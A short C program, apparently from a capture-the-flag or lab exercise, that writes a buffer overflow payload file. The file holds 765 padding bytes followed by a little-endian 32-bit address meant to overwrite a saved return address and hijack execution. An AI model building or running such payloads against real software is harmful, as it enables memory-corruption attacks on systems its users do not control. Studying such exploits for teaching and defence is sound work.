#include <stdio.h>

int main() {
	FILE *file = fopen("nice_payload", "w");
	for (int i = 0; i < 765; i++)
		fprintf(file, "%c", 97);
	fprintf(file, "%c%c%c%c",177,133,4,8);
	fclose(file);
	return 0; 
}
